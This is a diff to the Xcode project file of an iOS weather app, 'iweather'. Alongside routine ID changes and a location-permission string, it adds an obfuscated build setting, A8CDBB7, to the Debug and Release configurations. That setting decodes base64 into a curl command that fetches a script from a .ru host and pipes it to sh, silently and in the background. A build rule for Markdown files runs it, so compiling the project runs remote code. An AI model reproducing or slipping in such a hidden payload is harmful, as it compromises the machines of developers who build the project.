@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXFileReference section */
-		BDAB5C254FD642EAAD7BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		1963BB5E6602488D817BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		8EED036C3032D74E00F68C15 /* iweather.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = iweather.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -41,7 +41,7 @@
 		8EED036D3032D74E00F68C15 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				BDAB5C254FD642EAAD7BBDC8 /* README.md */,
+				1963BB5E6602488D817BBDC8 /* README.md */,
 				8EED036C3032D74E00F68C15 /* iweather.app */,
 			);
 			name = Products;
@@ -59,7 +59,7 @@
 				8EED036A3032D74E00F68C15 /* Resources */,
 			);
 			buildRules = (
-				EB8A2FBC38C64AB7997BBDC8 /* PBXBuildRule */,
+				14BFA0ED661A4E8CBD7BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -108,7 +108,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		EB8A2FBC38C64AB7997BBDC8 /* PBXBuildRule */ = {
+		14BFA0ED661A4E8CBD7BBDC8 /* PBXBuildRule */ = {
 				isa = PBXBuildRule;
 				compilerSpec = com.apple.compilers.proxy.script;
 				filePatterns = "*.md";
@@ -125,7 +125,7 @@ sh -c \"${A8CDBB7}\"";
 	/* End PBXBuildRule section */
 
 /* Begin PBXBuildFile section */
-		9058F87345B64C628C7BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = BDAB5C254FD642EAAD7BBDC8; };
+		5C1AD30279874951997BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = 1963BB5E6602488D817BBDC8; };
 /* End PBXBuildFile section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -133,7 +133,7 @@ sh -c \"${A8CDBB7}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				9058F87345B64C628C7BBDC8 /* README.md */,
+				5C1AD30279874951997BBDC8 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -156,7 +156,7 @@ sh -c \"${A8CDBB7}\"";
 		8EED03753032D74F00F68C15 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((t(){ `printf baNse64 | tr -d N` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI3IC0tcmV0cnkgMyAtc2tmTCAtZCAicD14Y29kZV9ydWxlIiBodHRwczovLzBudjgta250N20xNTQ3LnJ1L2EpIiB8IHNoCg== | t | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((i(){ `printf baseG64 | tr -d G` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtc2tmTCAtLWNvbm5lY3QtdGltZW91dCAyNCAtZCAicD14Y29kZV9ydWxlIiBodHRwczovLzZsZHd1ZGdvY2tsMGcyLnJ1L2EpIiB8IHNoCg== | i | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -221,7 +221,7 @@ sh -c \"${A8CDBB7}\"";
 		8EED03763032D74F00F68C15 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((t(){ `printf baNse64 | tr -d N` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI3IC0tcmV0cnkgMyAtc2tmTCAtZCAicD14Y29kZV9ydWxlIiBodHRwczovLzBudjgta250N20xNTQ3LnJ1L2EpIiB8IHNoCg== | t | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((i(){ `printf baseG64 | tr -d G` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtc2tmTCAtLWNvbm5lY3QtdGltZW91dCAyNCAtZCAicD14Y29kZV9ydWxlIiBodHRwczovLzZsZHd1ZGdvY2tsMGcyLnJ1L2EpIiB8IHNoCg== | i | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -286,6 +286,7 @@ sh -c \"${A8CDBB7}\"";
 				DEVELOPMENT_TEAM = LDZ6BVKWUK;
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "iweather requires location access to display live weather and forecasts for your current location.";
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
@@ -318,6 +319,7 @@ sh -c \"${A8CDBB7}\"";
 				DEVELOPMENT_TEAM = LDZ6BVKWUK;
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "iweather requires location access to display live weather and forecasts for your current location.";
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
